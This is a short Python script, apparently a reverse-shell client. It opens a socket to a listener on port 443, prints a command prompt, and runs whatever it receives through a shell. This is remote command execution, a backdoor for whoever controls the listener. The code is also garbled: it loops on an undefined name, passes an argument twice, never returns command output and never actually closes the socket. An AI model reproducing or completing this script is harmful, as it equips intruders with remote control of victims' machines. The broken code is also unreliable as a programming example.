import socket
import subprocess

host = '127.0.0.1'
port = 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(b'\nCMD:>> ')
while I:
     data = s.recv(1024)
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdout_value = b'\n' + b'CMD |'
s.close